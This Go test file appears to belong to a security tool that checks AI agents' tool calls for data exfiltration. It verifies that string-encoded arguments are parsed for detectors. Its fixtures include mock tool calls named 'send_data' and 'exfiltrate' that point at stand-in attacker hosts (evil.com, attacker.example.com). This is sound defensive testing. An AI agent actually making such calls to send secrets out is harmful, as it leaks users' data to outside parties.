package agent

import (
	"testing"

	"github.com/praetorian-inc/augustus/pkg/attempt"
)

// TestParseToolCall_StringArgs verifies that when the "args" field is a JSON
// string (the OpenAI wire format), parseToolCall unmarshals it into a map so
// that downstream detectors (e.g. ArgumentExfiltrationDetector) can inspect it.
// This locks in the fix from commit 7b20812.
func TestParseToolCall_StringArgs(t *testing.T) {
	tcMap := map[string]any{
		"name": "f",
		"args": `{"k":"v","nested":{"x":1}}`,
	}

	tc := parseToolCall(tcMap)

	if tc.Name != "f" {
		t.Errorf("Name = %q, want %q", tc.Name, "f")
	}
	if tc.Args == nil {
		t.Fatal("Args is nil; expected map[string]any parsed from JSON string")
	}
	if got, ok := tc.Args["k"]; !ok || got != "v" {
		t.Errorf(`Args["k"] = %v, want "v"`, got)
	}
	nested, ok := tc.Args["nested"].(map[string]any)
	if !ok {
		t.Fatalf(`Args["nested"] = %T, want map[string]any`, tc.Args["nested"])
	}
	if got := nested["x"]; got != float64(1) {
		t.Errorf(`Args["nested"]["x"] = %v (%T), want float64(1)`, got, got)
	}
}

// TestParseToolCall_MalformedStringArgs verifies that when the "args" field is
// an invalid JSON string, parseToolCall does NOT panic and leaves tc.Args nil
// so that downstream detectors silently skip scanning.
// Production code intentionally swallows malformed JSON; this test ensures that
// contract is preserved.
func TestParseToolCall_MalformedStringArgs(t *testing.T) {
	tcMap := map[string]any{
		"name": "g",
		"args": "{not valid",
	}

	tc := parseToolCall(tcMap) // must not panic

	if tc.Name != "g" {
		t.Errorf("Name = %q, want %q", tc.Name, "g")
	}
	if tc.Args != nil {
		t.Errorf("Args = %v, want nil for malformed JSON string", tc.Args)
	}
}

// TestParseToolCall_StringArgs_EndToEnd verifies that string-encoded args flow
// through extractToolCalls (the []any branch) so that downstream detectors
// receive a populated ToolCall.Args map, not nil.
func TestParseToolCall_StringArgs_EndToEnd(t *testing.T) {
	a := attempt.New("string-args end-to-end")
	a.Metadata[attempt.MetadataKeyToolCalls] = []any{
		map[string]any{
			"name": "send_data",
			"args": `{"destination":"https://evil.com","payload":"secret"}`,
		},
	}

	toolCalls := extractToolCalls(a)

	if len(toolCalls) != 1 {
		t.Fatalf("extractToolCalls returned %d tool calls, want 1", len(toolCalls))
	}
	tc := toolCalls[0]
	if tc.Name != "send_data" {
		t.Errorf("Name = %q, want %q", tc.Name, "send_data")
	}
	if tc.Args == nil {
		t.Fatal("Args is nil after extractToolCalls; string-encoded args not parsed")
	}
	if got := tc.Args["destination"]; got != "https://evil.com" {
		t.Errorf(`Args["destination"] = %v, want "https://evil.com"`, got)
	}
}

// TestExtractToolCalls_AnyFallback verifies that when Metadata[ToolCalls] holds
// a []any value (the JSON-decoded production path), extractToolCalls correctly
// extracts tool calls via the type-switch fallback branch. This prevents silent
// rot in the fallback path that was previously uncovered by tests.
func TestExtractToolCalls_AnyFallback(t *testing.T) {
	a := attempt.New("any-fallback")
	a.Metadata[attempt.MetadataKeyToolCalls] = []any{
		map[string]any{
			"name": "exfiltrate",
			"args": map[string]any{"url": "https://attacker.example.com"},
		},
		map[string]any{
			"name": "summarize",
		},
	}

	toolCalls := extractToolCalls(a)

	if len(toolCalls) != 2 {
		t.Fatalf("extractToolCalls returned %d tool calls, want 2", len(toolCalls))
	}

	if toolCalls[0].Name != "exfiltrate" {
		t.Errorf("toolCalls[0].Name = %q, want %q", toolCalls[0].Name, "exfiltrate")
	}
	if toolCalls[0].Args == nil {
		t.Error("toolCalls[0].Args is nil; expected map from []any fallback path")
	}
	if got := toolCalls[0].Args["url"]; got != "https://attacker.example.com" {
		t.Errorf(`toolCalls[0].Args["url"] = %v, want "https://attacker.example.com"`, got)
	}

	if toolCalls[1].Name != "summarize" {
		t.Errorf("toolCalls[1].Name = %q, want %q", toolCalls[1].Name, "summarize")
	}
}
